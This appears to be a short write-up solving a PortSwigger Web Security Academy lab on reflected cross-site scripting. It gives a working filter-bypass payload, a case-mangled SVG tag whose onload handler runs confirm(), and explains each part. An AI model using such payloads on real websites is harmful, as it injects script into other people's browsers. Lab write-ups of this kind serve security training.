# Reflected XSS with some SVG markup allowed

**Lab Url**: [https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)

## Objective

This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.

To solve the lab, perform a cross-site scripting attack that calls the `alert()` function.

## Solution

The WAF blocks common HTML tags but allows certain SVG tags and event handlers.

### Step 1: Identify allowed SVG attributes

Through fuzzing, an SVG tag with the `onload` event (case-mangled to bypass filters) is found to be allowed.

### Step 2: Inject the payload

```text
/?search=<svG/x=">"/oNloaD=confirm()//
```

- `<svG` — the SVG tag opens (case variation may bypass filters)
- `x=">"` — dummy attribute to consume the `>`
- `/oNloaD=confirm()//` — the event handler with case variation, followed by `//` to comment out the rest

The script executes when the SVG loads, solving the lab.
